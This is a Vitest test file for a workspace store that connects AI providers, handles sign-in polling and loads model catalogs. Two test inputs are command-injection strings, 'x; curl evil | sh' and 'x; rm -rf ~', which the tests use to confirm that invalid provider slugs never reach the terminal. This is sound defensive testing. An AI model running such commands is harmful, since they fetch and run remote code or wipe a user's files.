import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  ipc,
  resetMockPiSetup,
  type PiAuthCheckResult,
  type PiModelCatalog,
  type PiSetupStatus,
} from '../types/ipc';
import { useWorkspaceStore } from '../store/workspaceStore';

function readyCheck(provider: string): PiAuthCheckResult {
  return { status: 'ready', provider, auth_type: 'api_key', reason: null };
}

function notReadyCheck(provider: string): PiAuthCheckResult {
  return { status: 'not_ready', provider, auth_type: null, reason: 'credentials_not_configured' };
}

function resetStore(): void {
  useWorkspaceStore.setState({
    workspace: null,
    openTabs: [],
    dirtyFiles: [],
    oneShotAttachments: [],
    chatMessages: [],
    piSetupStatus: null,
    providerDialog: { open: false, preselect: null, hiddenForSignIn: false },
    providerSignIn: null,
    modelCatalog: null,
    modelCatalogLoading: false,
    modelCatalogError: null,
    pendingTerminalCommand: null,
    bottomCollapsed: true,
    rightCollapsed: false,
    isSendingChat: false,
  });
}

async function seedSetupStatus(): Promise<PiSetupStatus> {
  const status = await ipc.piGetSetupStatus();
  useWorkspaceStore.setState({ piSetupStatus: status });
  return status;
}

/** In-memory Storage: under Node 26 + jsdom the global `localStorage` is undefined in tests. */
function createMemoryStorage(): Storage & { snapshot: () => Record<string, string> } {
  const data = new Map<string, string>();
  return {
    get length() {
      return data.size;
    },
    clear: () => data.clear(),
    getItem: (k) => data.get(k) ?? null,
    key: (i) => [...data.keys()][i] ?? null,
    removeItem: (k) => {
      data.delete(k);
    },
    setItem: (k, v) => {
      data.set(k, String(v));
    },
    snapshot: () => Object.fromEntries(data),
  };
}

describe('provider dialog slice', () => {
  beforeEach(() => {
    resetMockPiSetup();
    resetStore();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('openProviderDialog sets the preselect and closeProviderDialog resets it', () => {
    useWorkspaceStore.getState().openProviderDialog('openrouter');
    expect(useWorkspaceStore.getState().providerDialog).toEqual({
      open: true,
      preselect: 'openrouter',
      hiddenForSignIn: false,
    });

    useWorkspaceStore.getState().closeProviderDialog();
    expect(useWorkspaceStore.getState().providerDialog).toEqual({
      open: false,
      preselect: null,
      hiddenForSignIn: false,
    });
  });

  it('openProviderDialog without a provider clears a stale preselect', () => {
    useWorkspaceStore.getState().openProviderDialog('google');
    useWorkspaceStore.getState().closeProviderDialog();
    useWorkspaceStore.getState().openProviderDialog();
    expect(useWorkspaceStore.getState().providerDialog.preselect).toBeNull();
    expect(useWorkspaceStore.getState().providerDialog.open).toBe(true);
  });
});

describe('connectPiProvider', () => {
  beforeEach(() => {
    resetMockPiSetup();
    resetStore();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('writes the initial default after the catalog resolves when there is no usable default (S3-4)', async () => {
    const listSpy = vi.spyOn(ipc, 'piListModels');
    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');

    const { result, defaultChangedTo } = await useWorkspaceStore
      .getState()
      .connectPiProvider('openrouter', 'sk-test-ok');

    expect(result.check?.status).toBe('ready');
    expect(result.status.configured_providers).toContain('openrouter');
    expect(listSpy).toHaveBeenCalled();
    expect(configureSpy).toHaveBeenCalledTimes(1);
    expect(configureSpy).toHaveBeenCalledWith({
      provider: 'openrouter',
      model: 'anthropic/claude-sonnet-4.5',
      mark_completed: true,
    });
    expect(configureSpy.mock.invocationCallOrder[0]).toBeGreaterThan(
      listSpy.mock.invocationCallOrder[0]
    );
    expect(defaultChangedTo).toEqual({
      provider: 'openrouter',
      model: 'anthropic/claude-sonnet-4.5',
    });
    expect(useWorkspaceStore.getState().piSetupStatus?.needs_setup).toBe(false);
  });

  it('keeps the provider in the change note when the initial model is null (N3)', async () => {
    const { result, defaultChangedTo } = await useWorkspaceStore
      .getState()
      .connectPiProvider('mystery', 'sk-test-mystery');

    expect(result.check?.status).toBe('ready');
    expect(defaultChangedTo).toEqual({ provider: 'mystery', model: null });
  });

  it.each(['not_ready', 'check_error'] as const)(
    'applies the initial default when the check ends in %s (N5)',
    async (outcome) => {
      const base = await ipc.piGetSetupStatus();
      const status = {
        ...base,
        configured_providers: ['openrouter'],
        providers: base.providers.map((provider) =>
          provider.id === 'openrouter'
            ? { ...provider, configured: true, auth_type: 'api_key' }
            : provider
        ),
      };
      vi.spyOn(ipc, 'piConnectProvider').mockResolvedValue({
        status,
        check:
          outcome === 'not_ready'
            ? {
                status: 'not_ready',
                provider: 'openrouter',
                auth_type: null,
                reason: 'credentials_not_configured',
              }
            : null,
        check_error: outcome === 'check_error' ? 'could not verify the openrouter credential' : null,
      });
      const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');

      const { defaultChangedTo } = await useWorkspaceStore
        .getState()
        .connectPiProvider('openrouter', 'sk-test-ok');

      expect(configureSpy).toHaveBeenCalledWith({
        provider: 'openrouter',
        model: 'anthropic/claude-sonnet-4.5',
        mark_completed: true,
      });
      expect(defaultChangedTo).toEqual({
        provider: 'openrouter',
        model: 'anthropic/claude-sonnet-4.5',
      });
    }
  );

  it('keeps an existing usable default untouched', async () => {
    await ipc.piConfigureProvider({
      provider: 'opencode-go',
      model: 'deepseek-v4.1-flash',
      api_key: 'sk-test-old',
      mark_completed: true,
    });

    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');
    const { result, defaultChangedTo } = await useWorkspaceStore
      .getState()
      .connectPiProvider('openrouter', 'sk-test-ok');

    expect(result.check?.status).toBe('ready');
    expect(configureSpy).not.toHaveBeenCalled();
    expect(defaultChangedTo).toBeNull();
  });

  it('does not configure the default when the key is rejected', async () => {
    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');
    const { result, defaultChangedTo } = await useWorkspaceStore
      .getState()
      .connectPiProvider('openrouter', 'invalid-x');

    expect(result.check?.status).toBe('invalid');
    expect(result.status.configured_providers).not.toContain('openrouter');
    expect(configureSpy).not.toHaveBeenCalled();
    expect(defaultChangedTo).toBeNull();
  });

  it('never puts the key in the store state or localStorage (S3-7)', async () => {
    const storage = createMemoryStorage();
    vi.stubGlobal('localStorage', storage);
    try {
      await useWorkspaceStore.getState().connectPiProvider('openrouter', 'sk-test-secret');
      expect(JSON.stringify(useWorkspaceStore.getState())).not.toContain('sk-test-secret');
      expect(JSON.stringify(storage.snapshot())).not.toContain('sk-test-secret');
    } finally {
      vi.unstubAllGlobals();
    }
  });
});

describe('disconnectPiProvider', () => {
  beforeEach(async () => {
    resetMockPiSetup();
    resetStore();
    await ipc.piConfigureProvider({
      provider: 'opencode-go',
      model: 'deepseek-v4.1-flash',
      api_key: 'sk-test-old',
      mark_completed: true,
    });
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('writes the fallback default when disconnecting the default provider', async () => {
    await ipc.piConfigureProvider({
      provider: 'openrouter',
      api_key: 'sk-test-key',
      mark_completed: true,
    });
    await seedSetupStatus();
    expect(useWorkspaceStore.getState().piSetupStatus?.active_provider).toBe('openrouter');

    const logoutSpy = vi.spyOn(ipc, 'piLogoutProvider');
    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');

    const { defaultChangedTo, stillViaEnv } = await useWorkspaceStore
      .getState()
      .disconnectPiProvider('openrouter');

    expect(logoutSpy).toHaveBeenCalledTimes(1);
    expect(logoutSpy).toHaveBeenCalledWith('openrouter');
    expect(configureSpy).toHaveBeenCalledTimes(1);
    expect(configureSpy).toHaveBeenCalledWith({
      provider: 'opencode-go',
      model: 'deepseek-v4.1-flash',
      mark_completed: false,
    });
    expect(configureSpy.mock.invocationCallOrder[0]).toBeGreaterThan(
      logoutSpy.mock.invocationCallOrder[0]
    );
    expect(defaultChangedTo).toEqual({
      provider: 'opencode-go',
      model: 'deepseek-v4.1-flash',
    });
    expect(stillViaEnv).toBe(false);
  });

  it('disconnect default with failing catalog writes fallback with null model', async () => {
    await ipc.piConfigureProvider({
      provider: 'mystery',
      api_key: 'sk-test-mystery',
      mark_completed: true,
    });
    await ipc.piConfigureProvider({
      provider: 'openrouter',
      api_key: 'sk-test-key',
      mark_completed: true,
    });
    await seedSetupStatus();
    expect(useWorkspaceStore.getState().piSetupStatus?.active_provider).toBe('openrouter');

    vi.spyOn(ipc, 'piListModels').mockRejectedValue(new Error('catalog down'));
    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');

    const { defaultChangedTo } = await useWorkspaceStore
      .getState()
      .disconnectPiProvider('openrouter');

    expect(configureSpy).toHaveBeenCalledTimes(1);
    expect(configureSpy).toHaveBeenCalledWith({
      provider: 'mystery',
      model: null,
      mark_completed: false,
    });
    expect(defaultChangedTo).toEqual({ provider: 'mystery', model: null });
  });

  it('does not touch the default when disconnecting a non-default provider', async () => {
    await ipc.piConfigureProvider({
      provider: 'openrouter',
      api_key: 'sk-test-key',
      mark_completed: true,
    });
    await ipc.piConfigureProvider({
      provider: 'opencode-go',
      api_key: 'sk-test-old',
      mark_completed: true,
    });
    await seedSetupStatus();
    expect(useWorkspaceStore.getState().piSetupStatus?.active_provider).toBe('opencode-go');

    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');
    const { defaultChangedTo, stillViaEnv } = await useWorkspaceStore
      .getState()
      .disconnectPiProvider('openrouter');

    expect(configureSpy).not.toHaveBeenCalled();
    expect(defaultChangedTo).toBeNull();
    expect(stillViaEnv).toBe(false);
  });

  it('reports stillViaEnv when the provider keeps working through an environment variable', async () => {
    await seedSetupStatus();
    vi.spyOn(ipc, 'piCheckProvider').mockResolvedValue(readyCheck('opencode-go'));

    const { stillViaEnv } = await useWorkspaceStore.getState().disconnectPiProvider('opencode-go');

    expect(stillViaEnv).toBe(true);
  });

  it('does not check the environment for a provider without an env hint', async () => {
    await ipc.piConfigureProvider({
      provider: 'openai-codex',
      api_key: 'sk-test-codex',
      mark_completed: true,
    });
    await seedSetupStatus();
    const checkSpy = vi.spyOn(ipc, 'piCheckProvider');

    const { stillViaEnv } = await useWorkspaceStore
      .getState()
      .disconnectPiProvider('openai-codex');

    expect(checkSpy).not.toHaveBeenCalled();
    expect(stillViaEnv).toBe(false);
  });
});

describe('saveDefaultModel', () => {
  beforeEach(() => {
    resetMockPiSetup();
    resetStore();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('configures the staged provider and model', async () => {
    await ipc.piConfigureProvider({
      provider: 'opencode-go',
      api_key: 'sk-test-old',
      mark_completed: true,
    });
    await seedSetupStatus();
    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');

    await useWorkspaceStore
      .getState()
      .saveDefaultModel({ provider: 'openrouter', id: 'kimi-k3' }, true);

    expect(configureSpy).toHaveBeenCalledWith({
      provider: 'openrouter',
      model: 'kimi-k3',
      mark_completed: true,
    });
  });

  it('sends a null model for the active provider when nothing is staged', async () => {
    await ipc.piConfigureProvider({
      provider: 'opencode-go',
      api_key: 'sk-test-old',
      mark_completed: true,
    });
    await seedSetupStatus();
    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');

    await useWorkspaceStore.getState().saveDefaultModel(null, true);

    expect(configureSpy).toHaveBeenCalledWith({
      provider: 'opencode-go',
      model: null,
      mark_completed: true,
    });
  });

  it('does nothing without a provider to configure', async () => {
    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');
    await useWorkspaceStore.getState().saveDefaultModel(null, true);
    expect(configureSpy).not.toHaveBeenCalled();
  });
});

describe('sign-in slice', () => {
  beforeEach(() => {
    resetMockPiSetup();
    resetStore();
    vi.useFakeTimers();
  });

  afterEach(() => {
    useWorkspaceStore.getState().cancelProviderSignIn();
    vi.useRealTimers();
    vi.restoreAllMocks();
  });

  it('launches the interactive login, hides the dialog and polls until ready (AC13)', async () => {
    const loginSpy = vi.spyOn(useWorkspaceStore.getState(), 'launchPiInteractiveLogin');
    const checkSpy = vi.spyOn(ipc, 'piCheckProvider').mockResolvedValue(readyCheck('opencode-go'));
    const statusSpy = vi.spyOn(ipc, 'piGetSetupStatus');

    useWorkspaceStore.getState().startProviderSignIn('opencode-go');

    let st = useWorkspaceStore.getState();
    expect(loginSpy).toHaveBeenCalledWith('opencode-go');
    expect(st.providerDialog.hiddenForSignIn).toBe(true);
    expect(st.providerSignIn).toMatchObject({ provider: 'opencode-go', phase: 'waiting' });
    expect(checkSpy).not.toHaveBeenCalled();

    await vi.advanceTimersByTimeAsync(3000);

    expect(checkSpy).toHaveBeenCalledTimes(1);
    expect(checkSpy).toHaveBeenCalledWith('opencode-go');
    expect(statusSpy).toHaveBeenCalled();

    st = useWorkspaceStore.getState();
    expect(st.providerSignIn).toBeNull();
    expect(st.providerDialog.open).toBe(true);
    expect(st.providerDialog.hiddenForSignIn).toBe(false);
    expect(st.providerDialog.preselect).toBe('opencode-go');
  });

  it.each(['', '   ', 'Bad Slug', 'x; curl evil | sh', 'a'.repeat(65)])(
    'refuses to sign in with an invalid slug %j: no terminal command, no poll, dialog stays',
    async (slug) => {
      useWorkspaceStore.setState({
        providerDialog: { open: true, preselect: null, hiddenForSignIn: false },
      });
      const checkSpy = vi.spyOn(ipc, 'piCheckProvider').mockResolvedValue(readyCheck('x'));

      useWorkspaceStore.getState().startProviderSignIn(slug);
      await vi.advanceTimersByTimeAsync(10_000);

      const st = useWorkspaceStore.getState();
      expect(st.pendingTerminalCommand).toBeNull();
      expect(st.providerSignIn).toBeNull();
      expect(st.providerDialog.hiddenForSignIn).toBe(false);
      expect(checkSpy).not.toHaveBeenCalled();
    }
  );

  it('launchPiInteractiveLogin never writes an invalid slug to the terminal', () => {
    useWorkspaceStore.getState().launchPiInteractiveLogin('x; rm -rf ~');
    expect(useWorkspaceStore.getState().pendingTerminalCommand).toBeNull();

    useWorkspaceStore.getState().launchPiInteractiveLogin('my-proxy');
    expect(useWorkspaceStore.getState().pendingTerminalCommand).toBe('pi auth login my-proxy\r');
  });

  it('times out after two minutes without ready and keeps the dialog hidden', async () => {
    vi.spyOn(ipc, 'piCheckProvider').mockResolvedValue(notReadyCheck('opencode-go'));

    useWorkspaceStore.getState().openProviderDialog('opencode-go');
    useWorkspaceStore.getState().startProviderSignIn('opencode-go');
    await vi.advanceTimersByTimeAsync(120_000);

    const st = useWorkspaceStore.getState();
    expect(st.providerSignIn?.phase).toBe('timeout');
    expect(st.providerDialog.hiddenForSignIn).toBe(true);
  });

  it('openWorkspace stops a hidden sign-in poll and ignores its late result', async () => {
    let resolveCheck!: (value: PiAuthCheckResult) => void;
    vi.spyOn(ipc, 'piCheckProvider').mockImplementation(
      () => new Promise<PiAuthCheckResult>((resolve) => {
        resolveCheck = resolve;
      })
    );
    const statusSpy = vi.spyOn(ipc, 'piGetSetupStatus');

    useWorkspaceStore.getState().openProviderDialog('opencode-go');
    useWorkspaceStore.getState().startProviderSignIn('opencode-go');
    await vi.advanceTimersByTimeAsync(3000);
    expect(resolveCheck).toBeTypeOf('function');

    await useWorkspaceStore.getState().openWorkspace('/tmp/mock-game');
    const callsAfterOpen = statusSpy.mock.calls.length;

    resolveCheck(readyCheck('opencode-go'));
    await vi.advanceTimersByTimeAsync(0);

    const st = useWorkspaceStore.getState();
    expect(st.providerDialog.open).toBe(false);
    expect(st.providerSignIn).toBeNull();
    expect(statusSpy.mock.calls.length).toBe(callsAfterOpen);
  });

  it('cancelProviderSignIn stops the poll without opening the dialog', async () => {
    const checkSpy = vi.spyOn(ipc, 'piCheckProvider').mockResolvedValue(notReadyCheck('opencode-go'));

    useWorkspaceStore.getState().openProviderDialog('opencode-go');
    useWorkspaceStore.getState().startProviderSignIn('opencode-go');
    useWorkspaceStore.getState().revealProviderDialog();
    useWorkspaceStore.getState().cancelProviderSignIn();
    await vi.advanceTimersByTimeAsync(30_000);

    const st = useWorkspaceStore.getState();
    expect(checkSpy).not.toHaveBeenCalled();
    expect(st.providerSignIn).toBeNull();
    expect(st.providerDialog.hiddenForSignIn).toBe(false);
  });

  it('revealProviderDialog shows the dialog without losing the sign-in state', () => {
    useWorkspaceStore.getState().openProviderDialog('opencode-go');
    useWorkspaceStore.getState().startProviderSignIn('opencode-go');
    useWorkspaceStore.getState().revealProviderDialog();

    const st = useWorkspaceStore.getState();
    expect(st.providerDialog.open).toBe(true);
    expect(st.providerDialog.hiddenForSignIn).toBe(false);
    expect(st.providerDialog.preselect).toBe('opencode-go');
    expect(st.providerSignIn?.phase).toBe('waiting');
  });

  it('checkProviderSignInNow runs an immediate check while the poll is waiting', async () => {
    const checkSpy = vi.spyOn(ipc, 'piCheckProvider').mockResolvedValue(readyCheck('opencode-go'));

    useWorkspaceStore.getState().openProviderDialog('opencode-go');
    useWorkspaceStore.getState().startProviderSignIn('opencode-go');
    useWorkspaceStore.getState().checkProviderSignInNow();
    await vi.advanceTimersByTimeAsync(0);

    expect(checkSpy).toHaveBeenCalledTimes(1);
    expect(useWorkspaceStore.getState().providerSignIn).toBeNull();
    expect(useWorkspaceStore.getState().providerDialog.open).toBe(true);
  });

  it('hideProviderDialogForSignIn reveals the terminal without typing the login again (I2)', () => {
    useWorkspaceStore.getState().openProviderDialog('opencode-go');
    useWorkspaceStore.getState().startProviderSignIn('opencode-go');
    // The terminal consumed the first command; the modal must not queue it a second time.
    expect(useWorkspaceStore.getState().consumePendingTerminalCommand()).toBe(
      'pi auth login opencode-go\r'
    );

    useWorkspaceStore.getState().hideProviderDialogForSignIn();

    const st = useWorkspaceStore.getState();
    expect(st.pendingTerminalCommand).toBeNull();
    expect(st.providerDialog.hiddenForSignIn).toBe(true);
    expect(st.bottomCollapsed).toBe(false);
    expect(st.providerSignIn?.phase).toBe('waiting');
  });

  it('a re-sign-in uses manual checks only: no auto-poll and no timeout (I3)', async () => {
    await ipc.piConfigureProvider({
      provider: 'opencode-go',
      model: 'deepseek-v4.1-flash',
      api_key: 'sk-test-old',
      mark_completed: true,
    });
    await seedSetupStatus();
    const checkSpy = vi.spyOn(ipc, 'piCheckProvider').mockResolvedValue(readyCheck('opencode-go'));
    const listSpy = vi.spyOn(ipc, 'piListModels');

    useWorkspaceStore.getState().openProviderDialog('opencode-go');
    useWorkspaceStore
      .getState()
      .startProviderSignIn('opencode-go', { manualOnly: true, refetchCatalogOnReady: true });

    let st = useWorkspaceStore.getState();
    expect(st.pendingTerminalCommand).toBe('pi auth login opencode-go\r');
    expect(st.providerDialog.hiddenForSignIn).toBe(true);
    expect(st.providerSignIn?.phase).toBe('waiting');

    // The old credential would still read `ready`; no automatic check may run.
    await vi.advanceTimersByTimeAsync(130_000);
    expect(checkSpy).not.toHaveBeenCalled();
    expect(useWorkspaceStore.getState().providerSignIn?.phase).toBe('waiting');

    useWorkspaceStore.getState().revealProviderDialog();
    useWorkspaceStore.getState().checkProviderSignInNow();
    await vi.advanceTimersByTimeAsync(0);

    st = useWorkspaceStore.getState();
    expect(checkSpy).toHaveBeenCalledTimes(1);
    expect(listSpy).toHaveBeenCalledTimes(1);
    expect(st.providerSignIn).toBeNull();
    expect(st.providerDialog.hiddenForSignIn).toBe(false);
  });

  it('a manual not_ready check stays waiting instead of restarting the auto-poll (I3)', async () => {
    const checkSpy = vi
      .spyOn(ipc, 'piCheckProvider')
      .mockResolvedValue(notReadyCheck('opencode-go'));

    useWorkspaceStore.getState().openProviderDialog('opencode-go');
    useWorkspaceStore.getState().startProviderSignIn('opencode-go', { manualOnly: true });
    useWorkspaceStore.getState().checkProviderSignInNow();
    await vi.advanceTimersByTimeAsync(0);

    expect(checkSpy).toHaveBeenCalledTimes(1);
    expect(useWorkspaceStore.getState().providerSignIn?.phase).toBe('waiting');

    await vi.advanceTimersByTimeAsync(10_000);
    expect(checkSpy).toHaveBeenCalledTimes(1);
    expect(useWorkspaceStore.getState().providerSignIn?.phase).toBe('waiting');
  });

  it('a rejected manual check keeps manualOnly so a restart cannot resume the auto-poll (B1)', async () => {
    const checkSpy = vi
      .spyOn(ipc, 'piCheckProvider')
      .mockRejectedValue(new Error('ipc down'));

    useWorkspaceStore.getState().openProviderDialog('opencode-go');
    useWorkspaceStore.getState().startProviderSignIn('opencode-go', {
      manualOnly: true,
      refetchCatalogOnReady: true,
    });
    useWorkspaceStore.getState().checkProviderSignInNow();
    await vi.advanceTimersByTimeAsync(0);

    expect(useWorkspaceStore.getState().providerSignIn).toMatchObject({
      provider: 'opencode-go',
      phase: 'error',
      manualOnly: true,
    });

    await vi.advanceTimersByTimeAsync(130_000);
    expect(checkSpy).toHaveBeenCalledTimes(1);
    expect(useWorkspaceStore.getState().providerSignIn?.phase).toBe('error');
  });
});

describe('loadModelCatalog result', () => {
  beforeEach(() => {
    resetMockPiSetup();
    resetStore();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('resolves with the catalog', async () => {
    const catalog = await useWorkspaceStore.getState().loadModelCatalog();
    expect(catalog?.source).toBe('curated');
    expect(useWorkspaceStore.getState().modelCatalog).toBe(catalog);
  });

  it('resolves null for a superseded request', async () => {
    let resolveFirst!: (value: PiModelCatalog) => void;
    const second: PiModelCatalog = { source: 'pi_rpc', models: [], fallback_reason: null };
    vi.spyOn(ipc, 'piListModels')
      .mockImplementationOnce(
        () =>
          new Promise<PiModelCatalog>((resolve) => {
            resolveFirst = resolve;
          })
      )
      .mockResolvedValueOnce(second);

    const firstRequest = useWorkspaceStore.getState().loadModelCatalog();
    const secondRequest = useWorkspaceStore.getState().loadModelCatalog();
    await secondRequest;
    resolveFirst({ source: 'curated', models: [], fallback_reason: 'late' });

    await expect(firstRequest).resolves.toBeNull();
    expect(useWorkspaceStore.getState().modelCatalog).toBe(second);
  });

  it('resolves null when the catalog fails to load', async () => {
    vi.spyOn(ipc, 'piListModels').mockRejectedValue(new Error('boom'));
    await expect(useWorkspaceStore.getState().loadModelCatalog()).resolves.toBeNull();
    expect(useWorkspaceStore.getState().modelCatalogError).toBe('boom');
  });
});
